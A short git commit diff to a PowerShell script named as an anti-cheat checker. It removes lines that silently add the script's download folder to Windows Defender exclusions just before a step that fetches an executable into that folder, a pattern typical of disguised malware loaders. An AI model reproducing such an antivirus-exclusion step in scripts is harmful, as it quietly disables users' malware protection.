4a6b8e09f490eccac8d6ec621d5bec0d0a940fab
dieforme <russianmtc80@gmail.com>
2026-09-05 23:11:28 +0200

    Update nocheat-checker.ps1

--- nocheat-checker.ps1
+++ nocheat-checker.ps1
@@ -48,10 +48,6 @@ if (-not (Test-Path $workDir)) {
 $exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
-    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
-        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-    }
 
     Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
     
